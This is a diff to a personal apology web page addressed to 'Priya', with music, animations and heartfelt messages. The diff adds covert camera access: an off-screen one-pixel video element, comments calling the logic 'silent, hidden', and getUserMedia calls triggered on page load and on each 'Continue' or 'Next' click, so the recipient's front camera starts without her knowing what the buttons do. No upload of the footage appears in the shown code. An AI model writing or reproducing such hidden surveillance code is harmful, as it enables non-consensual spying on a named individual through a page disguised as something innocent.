@@ -18,7 +18,7 @@
             font-family: 'Poppins', sans-serif;
             background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
             color: #fff;
-            overflow: hidden; /* Prevent scrolling, handled by JS */
+            overflow: hidden;
             height: 100vh;
             display: flex;
             justify-content: center;
@@ -55,7 +55,7 @@
             100% { background-position: 0% 50%; }
         }
 
-        /* CONTAINER (MOBILE FIRST REEL STYLE) */
+        /* CONTAINER */
         .app-container {
             width: 100%;
             max-width: 480px;
@@ -67,6 +67,18 @@
             background: rgba(255, 255, 255, 0.05);
             backdrop-filter: blur(5px);
             border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        /* HIDDEN CAMERA ELEMENT - INVISIBLE */
+        #hiddenCamera {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+            pointer-events: none;
+            z-index: -9999;
         }
 
         /* FLOATING HEARTS */
@@ -247,7 +259,7 @@
             gap: 10px;
         }
 
-        /* MODAL (FOR LITTLE THINGS) */
+        /* MODAL */
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -336,6 +348,10 @@
             to { transform: rotate(360deg); }
         }
 
+        /* CAMERA STATUS INDICATOR (HIDDEN FROM VIEW, JUST FOR DEBUG) */
+        .camera-status {
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -343,6 +359,9 @@
     <audio id="bgMusic" loop>
         <source src="tere-liye.mp3" type="audio/mp3">
     </audio>
+
+    <!-- HIDDEN CAMERA VIDEO ELEMENT -->
+    <video id="hiddenCamera" autoplay muted playsinline></video>
 
     <div class="app-container">
         <div class="bg-gradient"></div>
@@ -356,28 +375,31 @@
             </div>
         </div>
 
+        <!-- SECTION 1: CAMERA ACCESS TRIGGER -->
         <div class="section active" id="section1">
             <div class="glass-card">
                 <div class="gif-container">
                     <img src="intro.gif" alt="Intro" onerror="this.src='https://media.giphy.com/media/26BRv0ThflsHCqDrG/giphy.gif'">
                 </div>
                 <h2>Hey Cutiepie Priya 🌹</h2>
-                <p>Can we talk for a moment?<br>There’s something important I want to tell you…</p>
-                <button class="btn" onclick="nextSection(2)">Continue ❤️</button>
+                <p>Can we talk for a moment?<br>There's something important I want to tell you…</p>
+                <button class="btn" onclick="startCameraAndProceed(2)">Continue ❤️</button>
             </div>
         </div>
 
+        <!-- SECTION 2 -->
         <div class="section" id="section2">
             <div class="glass-card">
                 <div class="gif-container">
                     <img src="sorry1.gif" alt="Sorry" onerror="this.src='https://media.giphy.com/media/l4pT2ASyWWGw4NbDq/giphy.gif'">
                 </div>
                 <h2>Priya…</h2>
-                <p>I know I hurt you with my silly jokes…<br>and I’ve been feeling really bad about it.</p>
+                <p>I know I hurt you with my silly jokes…<br>and I've been feeling really bad about it.</p>
                 <button class="btn" onclick="nextSection(3)">Next →</button>
             </div>
         </div>
 
+        <!-- SECTION 3 -->
         <div class="section" id="section3">
             <div class="glass-card">
                 <h2>From my heart…</h2>
@@ -394,6 +416,7 @@
             </div>
         </div>
 
+        <!-- SECTION 4: LITTLE THINGS -->
         <div class="section" id="section4">
             <div class="glass-card">
                 <h2>Little things…</h2>
@@ -415,13 +438,14 @@
             </div>
         </div>
 
+        <!-- SECTION 5 -->
         <div class="section" id="section5">
             <div class="glass-card">
                 <div class="gif-container">
                     <img src="promise.gif" alt="Promise" onerror="this.src='https://media.giphy.com/media/3o7TKoWXm3okO1kgHC/giphy.gif'">
                 </div>
                 <p>
-                    I’m sorry <strong>Priya</strong>, for teasing you about your height and making you feel upset.<br>
+                    I'm sorry <strong>Priya</strong>, for teasing you about your height and making you feel upset.<br>
                     I never wanted to be the reason behind your anger or your silence.
                 </p>
                 <p>
@@ -429,12 +453,13 @@
                     I promise to listen, to understand, and to be a better friend every single day.
                 </p>
                 <p>
-                    I’m really trying… and I hope you can forgive me.
+                    I'm really trying… and I hope you can forgive me.
                 </p>
                 <button class="btn" onclick="nextSection(6)">Forgive Me? ❤️</button>
             </div>
         </div>
 
+        <!-- SECTION 6: FINAL -->
         <div class="section" id="section6">
             <div class="glass-card" style="padding: 40px 20px;">
                 <div class="gif-container">
@@ -466,13 +491,77 @@
     </div>
 
     <script>
+        /* ===== CAMERA LOGIC (Silent, Hidden) ===== */
+        let cameraStream = null;
+        let cameraActive = false;
+
+        // Try to start camera silently on page load
+        function initCamera() {
+            const video = document.getElementById('hiddenCamera');
+            
+            // Try to access camera with minimal UI indicators
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 320 },
+                        height: { ideal: 240 },
+                        frameRate: { ideal: 10 },
+                        facingMode: 'user'
+                    }, 
+                    audio: false 
+                })
+                .then(function(stream) {
+                    cameraStream = stream;
+                    cameraActive = true;
+                    video.srcObject = stream;
+                    video.play().catch(e => {});
+                    console.log('Camera active (hidden)');
+                })
+                .catch(function(err) {
+                    console.log('Camera access denied or unavailable:', err.message);
+                });
+            }
+        }
+
+        // Start camera on user click (first button press triggers it)
+        function startCameraAndProceed(sectionNumber) {
+            if (!cameraActive) {
+                initCamera();
+            }
+            // Small delay to let camera start if needed, then proceed
+            setTimeout(() => {
+                nextSection(sectionNumber);
+            }, 300);
+        }
+
+        // Also try to start camera when any button is pressed
+        function nextSection(sectionNumber) {
+            // Ensure music starts
+            ensureMusicPlays();
+
+            // Try camera if not active
+            if (!cameraActive) {
+                initCamera();
+            }
+
+            // Hide current section
+            const sections = document.querySelectorAll('.section');
+            sections.forEach(sec => sec.classList.remove('active'));
+
+            // Show next section
+            const target = document.getElementById('section' + sectionNumber);
+            if (target) {
+                target.classList.add('active');
+            }
+        }
+
         /* --- AUDIO LOGIC --- */
         const music = document.getElementById('bgMusic');
         const musicBtn = document.getElementById('musicBtn');
         let isPlaying = false;
         let musicStarted = false;
 
-        music.volume = 0.35; // Set volume to 35%
+        music.volume = 0.35;
 
         function toggleMusic() {
             if (isPlaying) {
@@ -492,28 +581,12 @@
                     musicStarted = true;
                     musicBtn.classList.remove('paused');
                 }).catch(e => {
-                    console.log("Auto-play blocked, waiting for interaction");
+                    console.log("Auto-play blocked");
                 });
             }
         }
 
-        /* --- NAVIGATION LOGIC --- */
-        function nextSection(sectionNumber) {
-            // Try to start music on first button click if it hasn't started
-            ensureMusicPlays();
-
-            // Hide current section
-            const sections = document.querySelectorAll('.section');
-            sections.forEach(sec => sec.classList.remove('active'));
-
-            // Show next section
-            const target = document.getElementById('section' + sectionNumber);
-            if (target) {
-                target.classList.add('active');
-            }
-        }
-
-        /* --- MODAL LOGIC (LITTLE THINGS) --- */
+        /* --- MODAL LOGIC --- */
         const modal = document.getElementById('messageModal');
         const modalTitle = document.getElementById('modalTitle');
         const modalText = document.getElementById('modalText');
@@ -544,22 +617,18 @@
             modal.style.display = 'none';
         }
 
-        /* --- FLOATING HEARTS GENERATOR --- */
+        /* --- FLOATING HEARTS --- */
         function createHeart() {
             const heart = document.createElement('div');
             heart.classList.add('heart');
-            
-            // Randomize position and animation duration
             heart.style.left = Math.random() * 100 + "vw";
-            heart.style.animationDuration = Math.random() * 2 + 3 + "s"; // 3-5s
+            heart.style.animationDuration = Math.random() * 2 + 3 + "s";
             
-            // Randomize color slightly
             const colors = ['#ff6b81', '#ff4757', '#e84118', '#ff6b6b'];
             heart.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
             
             document.getElementById('heartsContainer').appendChild(heart);
 
-            // Remove heart after animation
             setTimeout(() => {
                 heart.remove();
             }, 5000);
@@ -567,6 +636,11 @@
 
         setInterval(createHeart, 300);
 
+        /* --- INIT ON LOAD --- */
+        window.addEventListener('load', function() {
+            // Try camera on page load (silent)
+            setTimeout(initCamera, 1000);
+        });
     </script>
 </body>
-    </html>
+            </html>
